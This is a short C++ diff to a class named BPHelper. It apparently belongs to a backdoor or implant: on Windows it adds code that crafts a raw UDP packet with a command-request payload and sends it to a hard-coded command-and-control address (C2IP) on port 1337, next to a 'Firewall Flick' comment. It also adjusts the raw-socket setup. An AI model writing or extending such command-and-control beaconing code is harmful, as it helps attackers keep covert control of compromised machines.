@@ -39,6 +39,11 @@ void BPHelper::requestAction() {
     payload.insert(payload.end(), bp_ptr, bp_ptr + sizeof(bp_command_request_header));
 
 #if defined(_WIN32) || defined(WIN32)
+    vector<uint8_t> req = CraftUDPPacket(rawSocket.getIP(),
+                                            C2IP,
+                                            1337,
+                                            1337,
+                                            payload);
     //Firewall Flick
     socketMutex.lock();
     rawSocket.send(req);
@@ -66,7 +71,7 @@ BPHelper::BPHelper() {
         nextHopMac = rawSocket.getMacOfIP(ntohl(C2IP));
     }
 #elif defined(_WIN32) || defined(WIN32)
-    rawSocket = RawSocket(C2IP, false);
+    rawSocket = RawSocket(C2IP);
 #endif
     currentCmd = 0;
 }
